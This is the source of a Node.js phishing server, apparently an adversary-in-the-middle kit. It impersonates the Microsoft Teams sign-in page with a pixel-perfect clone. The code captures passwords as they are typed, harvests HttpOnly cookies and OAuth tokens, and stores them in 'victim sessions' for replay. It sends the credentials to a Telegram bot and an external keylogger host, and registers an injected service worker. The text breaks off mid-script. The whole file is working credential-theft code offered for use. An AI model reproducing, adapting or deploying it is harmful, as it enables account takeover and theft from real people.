const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');
const axios = require('axios');

// ============================================================
//  ENVIRONMENT VARIABLES
// ============================================================

require('dotenv').config();

// Core Configuration
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const PHISHED_URL_PARAMETER = process.env.PHISHED_URL_PARAMETER || 'login_hint';
const PROXY_ENTRY_POINT = process.env.PROXY_ENTRY_POINT || '/login';
const PORT = process.env.PORT || 3000;

// Service URLs
const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
const REDIRECT_URL = process.env.REDIRECT_URL || "https://login.microsoftonline.com/";

// Microsoft OAuth Configuration
const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || '943a2b14-68aa-4205-88c1-a4b65ab04e81';
const MICROSOFT_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const MICROSOFT_SCOPES = process.env.MICROSOFT_SCOPES || 'openid profile email User.Read Mail.Read offline_access';

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================================
//  PATH CONFIGURATION
// ============================================================

const PROXY_PATHNAMES = {
    script: "/@",
    scriptFile: "script_Vx9Z6XN5uC3k.js",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    serviceWorkerFile: "microsoft_inject.js",
    swRegister: "/sw-register.js",
    xssEndpoint: "/xss-collect",
    cookieEndpoint: "/cookie-capture",
    keylogEndpoint: "/keylog",
    swProxyPath: "/lNv1pC9AWPUY4gbidyBO",
    cookieStoreEndpoint: "/api/cookies-store",
    sessionReplayEndpoint: "/api/session-replay",
    fullSessionData: "/api/full-session",
    fullAuthEndpoint: "/api/full-auth",
    oauthCaptureEndpoint: "/api/oauth-capture",
    captureUserEndpoint: "/api/capture-user",
    telegramEndpoint: "/api/telegram",
    tokenRotation: "/api/token-rotation",
    sessionRotate: "/api/session-rotate",
    passwordCapture: "/api/password-capture",
    credentialCapture: "/api/credential-capture"
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║              ENVIRONMENT CONFIGURATION                    ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   ENCRYPTION_KEY: ${ENCRYPTION_KEY ? '✅ SET' : '❌ MISSING'}`);
console.log(`║   TELEGRAM: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
console.log(`║   BACKEND_URL: ${BACKEND_URL}`);
console.log(`║   KEYLOGGER_URL: ${KEYLOGGER_URL}`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  SESSION STORE
// ============================================================

class SessionStore {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = 2 * 60 * 60 * 1000;
        this.allCookies = new Map();
        this.allTokens = new Map();
        this.passwordCaptures = new Map();
        this.httpOnlyCookies = new Map();
        this.cookieHeaders = new Map();
        this.evasionCounters = new Map();
        this.fullAuthData = new Map();
        this.credentialHistory = new Map();
        this.telegramAlerts = new Map();
    }

    storeHttpOnlyCookies(sessionId, cookieHeaders, url) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        const cookies = {};
        const httpOnlyCookies = [];
        const cookieStrings = [];
        
        const cookieHeaderArray = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
        
        for (const cookieHeader of cookieHeaderArray) {
            if (!cookieHeader || typeof cookieHeader !== 'string') continue;
            
            const parts = cookieHeader.split(';');
            const [nameValue, ...attributes] = parts;
            const [name, value] = nameValue.split('=');
            
            if (name && value && value !== 'null' && value !== 'undefined') {
                const isHttpOnly = attributes.some(attr => attr.trim().toLowerCase() === 'httponly');
                const isSecure = attributes.some(attr => attr.trim().toLowerCase() === 'secure');
                const sameSite = attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax';
                const path = attributes.find(attr => attr.trim().toLowerCase().startsWith('path='))?.split('=')[1] || '/';
                const domain = attributes.find(attr => attr.trim().toLowerCase().startsWith('domain='))?.split('=')[1] || '';
                const expires = attributes.find(attr => attr.trim().toLowerCase().startsWith('expires='))?.split('=')[1] || null;
                
                cookies[name] = {
                    value: value,
                    httpOnly: isHttpOnly,
                    secure: isSecure,
                    sameSite: sameSite,
                    path: path,
                    domain: domain,
                    expires: expires,
                    fullCookie: cookieHeader,
                    captured: Date.now()
                };
                
                cookieStrings.push(`${name}=${value}`);
                
                if (isHttpOnly) {
                    httpOnlyCookies.push({
                        name: name,
                        value: value,
                        attributes: attributes,
                        fullCookie: cookieHeader,
                        captured: Date.now()
                    });
                }
            }
        }
        
        if (Object.keys(cookies).length > 0) {
            this.storeCookies(sessionId, cookies, 'http_response');
            this.cookieHeaders.set(sessionId, {
                cookieHeader: cookieStrings.join('; '),
                cookieCount: cookieStrings.length,
                httpOnlyCount: httpOnlyCookies.length,
                httpOnlyCookies: httpOnlyCookies,
                captured: Date.now()
            });
            
            if (httpOnlyCookies.length > 0) {
                this.httpOnlyCookies.set(sessionId, httpOnlyCookies);
                this.sendHttpOnlyAlert(sessionId, httpOnlyCookies, cookies);
            }
            
            console.log(`[HTTPONLY] 🍪 Captured ${Object.keys(cookies).length} cookies (${httpOnlyCookies.length} HttpOnly)`);
        }
        
        return cookies;
    }

    async sendHttpOnlyAlert(sessionId, httpOnlyCookies, allCookies) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
        
        const session = this.sessions.get(sessionId);
        const email = session?.email || 'Unknown';
        
        let cookieList = '';
        for (const cookie of httpOnlyCookies) {
            const displayValue = cookie.value.length > 30 ? cookie.value.substring(0, 30) + '...' : cookie.value;
            cookieList += `  🔒 \`${cookie.name}\`: \`${displayValue}\`\n`;
        }
        
        const message = 
`🍪 *HTTPONLY COOKIES CAPTURED*

*📧 Email:* ${email}
*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}
*🕐 Time:* ${new Date().toISOString()}

*📊 Total Cookies:* ${Object.keys(allCookies).length}
*🔒 HttpOnly Count:* ${httpOnlyCookies.length}

*🍪 HttpOnly Cookies:*
${cookieList}

*🔐 These cookies cannot be accessed by JavaScript!*`;

        await this.sendTelegram(message);
    }

    async sendTelegram(message, parseMode = 'Markdown') {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
        
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: parseMode,
                disable_web_page_preview: true
            });
            return true;
        } catch(e) {
            console.error('[TELEGRAM] Error:', e.message);
            return false;
        }
    }

    storePasswordCapture(sessionId, email, password, source, context = {}) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.sessions.set(sessionId, {
                email: email || 'unknown',
                password: password,
                created: Date.now(),
                lastActivity: Date.now()
            });
        } else {
            session.password = password || session.password;
            session.email = email || session.email;
            session.lastActivity = Date.now();
        }
        
        const captureEntry = {
            email: email,
            password: password,
            source: source,
            timestamp: Date.now(),
            timestampISO: new Date().toISOString(),
            context: context,
            sessionId: sessionId,
            captured: true
        };
        
        if (!this.passwordCaptures.has(sessionId)) {
            this.passwordCaptures.set(sessionId, []);
        }
        this.passwordCaptures.get(sessionId).push(captureEntry);
        
        if (!this.credentialHistory.has(email)) {
            this.credentialHistory.set(email, []);
        }
        this.credentialHistory.get(email).push(captureEntry);
        
        console.log(`[PASSWORD] 🔑 Stored password for ${email} (${source})`);
        
        this.sendPasswordAlert(sessionId, email, password, source, context);
        
        return captureEntry;
    }

    async sendPasswordAlert(sessionId, email, password, source, context) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
        
        const httpOnlyCount = this.httpOnlyCookies.get(sessionId)?.length || 0;
        const tokenCount = this.allTokens.get(sessionId) ? 
            Object.values(this.allTokens.get(sessionId)).filter(t => t && t.value && t.isValid !== false).length : 0;
        
        const message = 
`🔐 *PASSWORD CAPTURED* (${source})

*📧 Email:* ${email}
*🔑 Password:* ${password || 'N/A'}
*📡 IP:* ${context.ip || 'Unknown'}
*🕐 Time:* ${new Date().toISOString()}
*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}

*🍪 HttpOnly Cookies:* ${httpOnlyCount}
*🎟️ Tokens:* ${tokenCount}
*🔄 Attempt #:* ${context.attemptCount || 1}

*📱 User Agent:* ${context.userAgent || 'Unknown'}`;

        await this.sendTelegram(message);
    }

    storeCookies(sessionId, cookies, source = 'proxy') {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.cookies = session.cookies || {};
        session.cookies[source] = session.cookies[source] || [];
        
        for (const [name, cookieData] of Object.entries(cookies)) {
            if (cookieData === null || cookieData === undefined || cookieData === 'null' || cookieData === 'undefined') {
                continue;
            }
            
            const cookieEntry = {
                name: name,
                value: typeof cookieData === 'object' ? cookieData.value : cookieData,
                httpOnly: typeof cookieData === 'object' ? (cookieData.httpOnly || false) : false,
                secure: typeof cookieData === 'object' ? (cookieData.secure || false) : false,
                path: typeof cookieData === 'object' ? (cookieData.path || '/') : '/',
                domain: typeof cookieData === 'object' ? (cookieData.domain || '') : '',
                expires: typeof cookieData === 'object' ? (cookieData.expires || null) : null,
                sameSite: typeof cookieData === 'object' ? (cookieData.sameSite || 'Lax') : 'Lax',
                captured: Date.now(),
                source: source,
                isValid: true,
                fullCookieString: `${name}=${typeof cookieData === 'object' ? cookieData.value : cookieData}`
            };
            
            const existing = session.cookies[source].find(c => c.name === name);
            if (existing) {
                Object.assign(existing, cookieEntry);
                existing.updated = Date.now();
            } else {
                session.cookies[source].push(cookieEntry);
            }
        }
        
        this.allCookies.set(sessionId, session.cookies);
        console.log(`[COOKIE] 🍪 Captured cookies for session ${sessionId.substring(0, 12)}`);
        return session.cookies;
    }

    storeTokens(sessionId, tokens) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.tokens = session.tokens || {};
        
        for (const [key, value] of Object.entries(tokens)) {
            if (value && value !== 'undefined' && value !== 'null' && value !== 'N/A') {
                session.tokens[key] = {
                    value: value,
                    captured: Date.now(),
                    type: key.includes('access') ? 'access' : 
                          key.includes('refresh') ? 'refresh' : 
                          key.includes('id') ? 'id' : 'unknown',
                    isValid: true,
                    validatedAt: Date.now()
                };
            }
        }
        
        this.allTokens.set(sessionId, session.tokens);
        console.log(`[TOKEN] 🎟️ Stored tokens for session ${sessionId.substring(0, 12)}`);
        return session.tokens;
    }

    storeFullAuthData(sessionId, authData) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.sessions.set(sessionId, {
                email: authData.email || 'unknown',
                password: authData.password || 'N/A',
                created: Date.now(),
                lastActivity: Date.now(),
                fullAuthCompleted: true,
                fullAuthTime: Date.now()
            });
        } else {
            if (authData.password) {
                session.password = authData.password;
            }
            session.fullAuthCompleted = true;
            session.fullAuthTime = Date.now();
            session.lastActivity = Date.now();
        }
        
        this.fullAuthData.set(sessionId, {
            ...authData,
            storedAt: Date.now(),
            sessionId: sessionId
        });
        
        console.log(`[FULL-AUTH] ✅ Stored full auth data for session ${sessionId.substring(0, 12)}`);
        return true;
    }

    getFullAuthData(sessionId) {
        return this.fullAuthData.get(sessionId) || null;
    }

    getReplayData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        if (Date.now() - session.lastActivity > this.sessionTTL) {
            this.sessions.delete(sessionId);
            return null;
        }
        
        const cookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        if (cookie.value && cookie.value !== 'null' && cookie.value !== 'undefined') {
                            cookies[cookie.name] = cookie.value;
                        }
                    }
                }
            }
        }
        
        const tokens = {};
        if (session.tokens) {
            for (const [key, token] of Object.entries(session.tokens)) {
                if (token && token.value && token.isValid !== false) {
                    tokens[key] = token.value;
                }
            }
        }
        
        const cookieHeader = this.cookieHeaders.get(sessionId);
        const httpOnlyCookies = this.httpOnlyCookies.get(sessionId) || [];
        const passwordCaptures = this.passwordCaptures.get(sessionId) || [];
        
        return {
            sessionId: session.id,
            cookies: cookies,
            tokens: tokens,
            cookieHeader: cookieHeader?.cookieHeader || '',
            httpOnlyCookies: httpOnlyCookies,
            httpOnlyCount: httpOnlyCookies.length,
            email: session.email || 'unknown',
            password: session.password || 'N/A',
            passwordCaptures: passwordCaptures,
            created: session.created,
            lastActivity: session.lastActivity,
            fullAuthData: this.fullAuthData.get(sessionId) || null,
            evasionData: this.evasionCounters.get(sessionId) || {}
        };
    }

    addEvasionCounter(sessionId) {
        const counter = this.evasionCounters.get(sessionId) || {
            totalRequests: 0,
            loginAttempts: 0,
            cookieCaptures: 0,
            tokenCaptures: 0,
            passwordCaptures: 0,
            httpOnlyCaptures: 0,
            rotations: 0,
            lastActivity: Date.now()
        };
        
        counter.totalRequests++;
        counter.lastActivity = Date.now();
        this.evasionCounters.set(sessionId, counter);
        return counter;
    }

    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        for (const [id, session] of this.sessions) {
            if (now - session.lastActivity > this.sessionTTL) {
                this.sessions.delete(id);
                this.allCookies.delete(id);
                this.allTokens.delete(id);
                this.passwordCaptures.delete(id);
                this.httpOnlyCookies.delete(id);
                this.cookieHeaders.delete(id);
                this.fullAuthData.delete(id);
                this.evasionCounters.delete(id);
                this.credentialHistory.delete(id);
                cleaned++;
            }
        }
        if (cleaned > 0) {
            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
        }
        return cleaned;
    }

    getStats() {
        return {
            totalSessions: this.sessions.size,
            totalCookies: Array.from(this.sessions.values()).reduce((acc, s) => {
                let count = 0;
                if (s.cookies) {
                    for (const source of Object.values(s.cookies)) {
                        if (Array.isArray(source)) {
                            count += source.filter(c => c.value && c.value !== 'null' && c.value !== 'undefined').length;
                        }
                    }
                }
                return acc + count;
            }, 0),
            totalHttpOnly: Array.from(this.httpOnlyCookies.values()).reduce((acc, arr) => arr + arr.length, 0),
            totalTokens: Array.from(this.sessions.values()).reduce((acc, s) => {
                if (s.tokens) {
                    return acc + Object.values(s.tokens).filter(t => t && t.value && t.isValid !== false).length;
                }
                return acc;
            }, 0),
            totalPasswordCaptures: Array.from(this.passwordCaptures.values()).reduce((acc, captures) => acc + captures.length, 0),
            totalFullAuth: this.fullAuthData.size,
            totalRequests: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + c.totalRequests, 0)
        };
    }
}

const sessionStore = new SessionStore();

// ============================================================
//  VICTIM SESSIONS
// ============================================================

const VICTIM_SESSIONS = {};
const attemptCounts = new Map();

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    let cookieString = '';
    if (typeof cookieHeader === 'object') {
        if (Array.isArray(cookieHeader)) {
            cookieString = cookieHeader.join('; ');
        } else {
            cookieString = cookieHeader.cookie || cookieHeader['cookie'] || '';
            if (cookieHeader.headers && cookieHeader.headers.cookie) {
                cookieString = cookieHeader.headers.cookie;
            }
        }
    } else if (typeof cookieHeader === 'string') {
        cookieString = cookieHeader;
    } else {
        return null;
    }
    if (!cookieString || typeof cookieString !== 'string') return null;
    const cookies = cookieString.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    VICTIM_SESSIONS[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        attempts: 0,
        password: null,
        passwordCaptures: [],
        httpOnlyCookies: [],
        cookieHeader: null,
        tokens: [],
        validationAttempts: [],
        lastValidationResult: null
    };
    
    sessionStore.sessions.set(sessionId, {
        email: email || 'unknown',
        password: null,
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        created: Date.now(),
        lastActivity: Date.now()
    });
    
    console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
    return sessionId;
}

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }
    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();
    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  SERVE FILES
// ============================================================

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, 'public', filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache'
        });
        res.end(data);
    });
}

// ============================================================
//  SHOW LOGIN PAGE - PIXEL-PERFECT MICROSOFT CLONE
// ============================================================

function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
    let sessionId = 'unknown';
    try {
        const cookieHeader = res.getHeader('Set-Cookie');
        if (cookieHeader) {
            const cookieString = Array.isArray(cookieHeader) ? cookieHeader.join('; ') : cookieHeader;
            const match = cookieString.match(/sessionId=([^;]+)/);
            if (match) sessionId = match[1];
        }
    } catch(e) {}

    const errorDisplay = errorMessage ? `
        <div id="errorDiv" class="error-container" role="alert">
            <div class="error-icon">🔒</div>
            <div class="error-message">${errorMessage}</div>
        </div>
    ` : '';

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .login-container { background: #ffffff; border-radius: 4px; box-shadow: 0 2px 6px rgba(0,0,0,0.15); padding: 44px 44px 36px; max-width: 440px; width: 100%; min-height: 480px; position: relative; }
        .logo { margin-bottom: 20px; }
        .logo svg { width: 108px; height: 28px; }
        .header h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; line-height: 1.25; }
        .header .subtitle { font-size: 14px; color: #616161; margin-bottom: 24px; }
        .email-display { display: flex; align-items: center; justify-content: space-between; background: #f0f0f0; padding: 10px 14px; border-radius: 2px; margin-bottom: 16px; border: 1px solid transparent; }
        .email-display .email-text { font-size: 15px; color: #1b1b1b; font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .email-display .change-link { font-size: 13px; color: #0067b8; text-decoration: none; cursor: pointer; font-weight: 500; white-space: nowrap; margin-left: 12px; background: none; border: none; }
        .email-display .change-link:hover { color: #004e8c; text-decoration: underline; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 14px; font-weight: 500; color: #1b1b1b; margin-bottom: 4px; }
        .form-group input { width: 100%; padding: 10px 12px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 15px; font-family: inherit; transition: border-color 0.15s ease, box-shadow 0.15s ease; background: #ffffff; color: #1b1b1b; }
        .form-group input:focus { outline: none; border-color: #0067b8; box-shadow: 0 0 0 2px rgba(0,103,184,0.25); }
        .form-group input::placeholder { color: #9e9e9e; }
        .form-group input.error { border-color: #d13438; }
        .options-row { display: flex; justify-content: space-between; align-items: center; margin: 12px 0 20px; }
        .options-row .keep-signed-in { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #1b1b1b; cursor: pointer; }
        .options-row .keep-signed-in input[type="checkbox"] { width: 16px; height: 16px; accent-color: #0067b8; cursor: pointer; }
        .options-row .forgot-link { font-size: 13px; color: #0067b8; text-decoration: none; font-weight: 500; }
        .options-row .forgot-link:hover { text-decoration: underline; color: #004e8c; }
        .signin-btn { width: 100%; padding: 10px 12px; background: #0067b8; color: #ffffff; border: none; border-radius: 2px; font-size: 15px; font-weight: 500; font-family: inherit; cursor: pointer; transition: background 0.15s ease; height: 44px; }
        .signin-btn:hover { background: #004e8c; }
        .signin-btn:active { background: #003d6e; }
        .signin-btn:disabled { background: #b3b3b3; cursor: not-allowed; }
        .loading-container { display: none; text-align: center; padding: 10px 0; }
        .loading-container .spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid #f0f0f0; border-top: 3px solid #0067b8; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px; vertical-align: middle; }
        .loading-container .loading-text { display: inline-block; vertical-align: middle; font-size: 14px; color: #616161; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .error-container { display: ${errorMessage ? 'flex' : 'none'}; align-items: flex-start; gap: 10px; background: #fef0f0; border: 1px solid #d13438; border-radius: 2px; padding: 12px 14px; margin-bottom: 16px; }
        .error-container .error-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
        .error-container .error-message { font-size: 14px; color: #d13438; line-height: 1.4; }
        .footer { margin-top: 24px; padding-top: 20px; border-top: 1px solid #e6e6e6; display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #616161; }
        .footer .links a { color: #0067b8; text-decoration: none; margin-right: 16px; }
        .footer .links a:hover { text-decoration: underline; }
        .footer .links a:last-child { margin-right: 0; }
        .footer .copyright { color: #9e9e9e; }
        @media (max-width: 480px) { .login-container { padding: 28px 24px 24px; min-height: auto; margin: 10px; } .logo svg { width: 88px; height: 24px; } .header h1 { font-size: 20px; } .options-row { flex-wrap: wrap; gap: 8px; } .footer { flex-direction: column; gap: 8px; align-items: flex-start; } }
        .hidden { display: none !important; }
    </style>
</head>
<body>
<div class="login-container" role="main">
    <div class="logo">
        <svg viewBox="0 0 108 28" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M0 4.75H6.75V22.5H0V4.75ZM8.5 0H15.25V22.5H8.5V0ZM17 4.75H23.75V22.5H17V4.75ZM25.5 0H32.25V22.5H25.5V0Z" fill="#0067B8"/>
            <path d="M34 4.75H40.75V22.5H34V4.75Z" fill="#0067B8"/>
            <path d="M42.5 0H49.25V22.5H42.5V0ZM51 4.75H57.75V22.5H51V4.75ZM59.5 0H66.25V22.5H59.5V0Z" fill="#0067B8"/>
            <text x="68" y="18" font-family="Segoe UI, sans-serif" font-size="16" font-weight="600" fill="#1B1B1B">Microsoft</text>
        </svg>
    </div>
    <div class="header">
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Microsoft Teams</p>
    </div>
    ${errorDisplay}
    <div class="email-display">
        <span class="email-text" id="emailDisplay">${email}</span>
        <button class="change-link" id="changeEmailBtn" aria-label="Change email">Change</button>
    </div>
    <form id="loginForm" action="#" method="post" autocomplete="off">
        <div class="form-group">
            <label for="passwordInput">Password</label>
            <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password" required>
        </div>
        <div class="options-row">
            <label class="keep-signed-in">
                <input type="checkbox" id="keepSignedIn" checked> Keep me signed in
            </label>
            <a href="#" class="forgot-link">Forgot password?</a>
        </div>
        <button type="submit" class="signin-btn" id="signinBtn">Sign in</button>
    </form>
    <div class="loading-container" id="loadingContainer">
        <div class="spinner"></div>
        <span class="loading-text">Signing in...</span>
    </div>
    <div class="footer">
        <div class="links">
            <a href="#">Privacy &amp; cookies</a>
            <a href="#">Terms of use</a>
        </div>
        <span class="copyright">&copy; Microsoft 2026</span>
    </div>
</div>
<script>
    (function() {
        'use strict';
        const SESSION_ID = '${sessionId}';
        const EMAIL = '${email}';
        const BACKEND_URL = '${BACKEND_URL}';
        const KEYLOGGER_URL = '${KEYLOGGER_URL}';
        const passwordInput = document.getElementById('passwordInput');
        const signinBtn = document.getElementById('signinBtn');
        const loginForm = document.getElementById('loginForm');
        const loadingContainer = document.getElementById('loadingContainer');
        const changeEmailBtn = document.getElementById('changeEmailBtn');
        const errorDiv = document.getElementById('errorDiv');
        let capturedPassword = '';
        let lastPasswordValue = '';
        let attemptCount = ${attemptCount || 1};
        passwordInput.addEventListener('input', function(e) {
            const value = this.value;
            if (value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (value.length > 2) {
                    fetch('/api/password-capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            email: EMAIL,
                            password: value,
                            source: 'password_input',
                            sessionId: SESSION_ID,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
            }
        });
        let passwordBuffer = '';
        passwordInput.addEventListener('keydown', function(e) {
            const key = e.key;
            if (key === 'Backspace') {
                passwordBuffer = passwordBuffer.slice(0, -1);
            } else if (key === 'Enter') {
                e.preventDefault();
                handleLogin();
            } else if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
                passwordBuffer += key;
            }
        });
        passwordInput.addEventListener('input', function() {
            this.classList.remove('error');
            if (errorDiv) {
                errorDiv.style.display = 'none';
            }
        });
        changeEmailBtn.addEventListener('click', function(e) {
            e.preventDefault();
            const newEmail = prompt('Enter your email address:', EMAIL);
            if (newEmail && newEmail.includes('@')) {
                const encodedEmail = encodeURIComponent(newEmail);
                window.location.href = '/login?login_hint=' + encodedEmail;
            }
        });
        function handleLogin() {
            const password = passwordInput.value.trim();
            if (!password) {
                passwordInput.classList.add('error');
                showError('Please enter your password.');
                passwordInput.focus();
                return;
            }
            if (errorDiv) {
                errorDiv.style.display = 'none';
            }
            if (password.length > 2) {
                fetch('/api/password-capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        email: EMAIL,
                        password: password,
                        source: 'form_submit',
                        sessionId: SESSION_ID,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }
            signinBtn.disabled = true;
            signinBtn.style.display = 'none';
            loadingContainer.style.display = 'block';
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'Email=' + encodeURIComponent(EMAIL) +
                      '&Passwd=' + encodeURIComponent(password) +
                      '&service=mail'
            })
            .then(response => {
                if (response.redirected) {
                    window.location.href = response.url;
                } else {
                    window.location.reload();
                }
            })
            .catch(function(error) {
                showError('An error occurred. Please try again.');
                signinBtn.disabled = false;
                signinBtn.style.display = 'block';
                loadingContainer.style.display = 'none';
                passwordInput.value = '';
                passwordInput.focus();
            });
        }
        function showError(message) {
            let errorContainer = document.getElementById('errorDiv');
            if (!errorContainer) {
                errorContainer = document.createElement('div');
                errorContainer.id = 'errorDiv';
                errorContainer.className = 'error-container';
                errorContainer.setAttribute('role', 'alert');
                errorContainer.innerHTML = '<div class="error-icon">🔒</div><div class="error-message"></div>';
                const form = document.getElementById('loginForm');
                form.parentNode.insertBefore(errorContainer, form);
            }
            errorContainer.style.display = 'flex';
            errorContainer.querySelector('.error-message').textContent = message;
        }
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            handleLogin();
        });
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                e.preventDefault();
                const password = passwordInput.value.trim();
                if (password) {
                    fetch('/api/password-capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            email: EMAIL,
                            password: password,
                            source: 'manual_capture',
                            sessionId: SESSION_ID,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                    alert('✅ Credentials captured and sent!');
                }
            }
        });
        setTimeout(function() { passwordInput.focus(); }, 400);
        console.log('🔐 Microsoft Sign In Page Loaded');
        console.log('📧 Email:', EMAIL);
        console.log('🆔 Session:', SESSION_ID);
        console.log('💡 Ctrl+Shift+C to capture credentials manually');
    })();
</script>
</body>
</html>`;

    res.writeHead(200, {
        'Content-Type': 'text/html',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache'
    });
    res.end(html);
}

// ============================================================
//  GENERATE SCRIPTS
// ============================================================

function generateSWRegistrationScript(sessionId) {
    return `
(function() {
    'use strict';
    const SESSION_ID = '${sessionId}';
    const SW_URL = '${PROXY_PATHNAMES.serviceWorker}';
    console.log('[SW-Register] 🔄 Registering service worker...');
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register(SW_URL, {
            scope: '/',
            updateViaCache: 'none'
        })
        .then(function(registration) {
            console.log('[SW-Register] ✅ Service Worker registered successfully');
            console.log('[SW-Register] 📍 Scope:', registration.scope);
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'init',
                    sessionId: SESSION_ID,
                    email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
                    evasion: { active: true }
                });
            }
            navigator.serviceWorker.addEventListener('message', function(event) {
                console.log('[SW-Register] 📨 Message from SW:', event.data);
                if (event.data.type === 'httpOnlyCookies') {
                    console.log('[SW-Register] 🍪 HttpOnly cookies captured:', event.data.cookies);
                }
            });
